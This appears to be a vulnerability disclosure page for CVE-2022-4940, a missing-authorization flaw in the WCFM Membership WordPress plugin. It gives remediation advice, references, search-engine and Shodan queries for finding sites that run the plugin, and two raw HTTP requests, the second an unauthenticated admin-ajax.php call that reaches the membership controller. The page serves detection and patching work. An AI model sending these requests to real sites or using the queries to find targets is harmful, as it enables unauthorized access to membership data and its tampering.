---
layout: post
cve_id: CVE-2022-4940
title: WCFM Membership <= 2.10.0 - Broken Access Control
pcap: true
pcap_path: /pcaps/2022/CVE-2022-4940.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4940.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0xanis
severity: high
impact: 'Unauthenticated attackers can modify membership details, approve or deny
  memberships, and change renewal info, potentially leading to data tampering and
  unauthorized access.

  '
remediation: 'Update to WCFM Membership version 2.10.1 or later.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wc-multivendor-membership/wcfm-membership-2100-missing-authorization
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2633191%40wc-multivendor-membership&new=2633191%40wc-multivendor-membership&sfp_email=&sfph_mail=
- https://wpscan.com/vulnerability/41bdf07c-d707-436b-8cfc-5ef852f0b7f5/
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
  cvss-score: 7.3
  cve-id: CVE-2022-4940
  epss-score: 0.11237
  epss-percentile: 0.93281
  cwe-id: CWE-862
metadata:
  verified: true
  max-request: 2
  vendor: wclovers
  product: wcfm_membership
  framework: wordpress
  google-query: inurl:"/wp-content/plugins/wc-multivendor-membership/"
  shodan-query: http.html:"wc-multivendor-membership"
tags:
- cve
- cve2022
- wordpress
- wp-scan
- wp-plugin
- wcfm
- vkev
- woocommerce
---

## ðŸ” Vulnerability Description
The WCFM Membership plugin for WordPress is vulnerable to unauthorized modification and access of data in versions up to, and including, 2.10.0 due to missing capability checks true the AJAX actions: wcfm-memberships, wcfm-memberships-manage, and wcfm-memberships-settings.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.22
Connection: close
Content-Length: 103
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

action=wcfm_ajax_controller&controller=wcfm-memberships&wcfm_ajax_nonce=Sg1Rrz&length=10&start=0&draw=1
```

